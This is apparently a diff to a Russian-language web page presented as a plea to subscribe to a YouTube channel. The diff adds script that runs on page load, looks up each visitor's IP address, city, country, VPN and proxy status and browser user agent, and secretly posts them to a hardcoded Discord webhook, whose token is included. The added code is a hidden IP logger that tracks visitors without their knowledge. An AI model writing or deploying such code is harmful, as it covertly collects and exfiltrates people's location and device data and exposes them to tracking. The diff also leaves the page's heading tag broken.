@@ -17,10 +17,68 @@
   </style>
 </head>
 <body>
-
-  <h1>Подпишись на YouTube канал</h1>
+  <h1>Подпишись на YouTube канал</
   <h2>@Gojosatoru01Stendoff</h2>
   <img src="https://i.imgur.com/zDKrSmT.png" alt="YouTube Banner">
 
  <script>
   const webhookURL = "https://discord.com/api/webhooks/1390405567243227207/kdnHZFuPDGfTaVYFlMMTRiGPk1nA8EKCymVm3NdjNUO4opU5MaEUD4KX27eUi1Z68OD6";
+
+const storageKey = "gojo-ips";
+const visitedKey = "gojo-visits";
+
+async function getIPData() {
+  const res = await fetch("https://ipapi.co/json/");
+  return await res.json();
+}
+
+function logToDiscord(message) {
+  fetch(webhookURL, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ content: message })
+  });
+}
+
+async function main() {
+  const data = await getIPData();
+  const ip = data.ip || "undefined";
+  const isVPN = data.security?.vpn ? "Да" : "Нет";
+  const proxy = data.security?.proxy ? "Да" : "Нет";
+  const device = navigator.userAgent;
+
+  const visits = parseInt(localStorage.getItem(visitedKey) || "0") + 1;
+  localStorage.setItem(visitedKey, visits);
+
+  let knownIPs = JSON.parse(localStorage.getItem(storageKey) || "[]");
+  if (!knownIPs.includes(ip)) {
+    knownIPs.push(ip);
+    localStorage.setItem(storageKey, JSON.stringify(knownIPs));
+  }
+
+  document.getElementById("info").innerText = `
+🔎 IP: ${ip}
+🌍 Страна: ${data.country_name}
+🏙 Город: ${data.city}
+🔒 VPN: ${isVPN}
+🧰 Прокси: ${proxy}
+📱 Устройство: ${device}
+
+👁️ Уникальных гостей: ${knownIPs.length}
+🧾 Всего переходов: ${visits}
+  `;
+
+  logToDiscord(`
+🔎 **Новый гость на сайте!**
+**IP:** ${ip}
+**Страна:** ${data.country_name}
+**Город:** ${data.city}
+**VPN:** ${isVPN}
+**Прокси:** ${proxy}
+**Устройство:** ${device}
+**👁️ Уникальных гостей:** ${knownIPs.length}
+**🧾 Переходов с устройства:** ${visits}
+  `);
+}
+
+main();
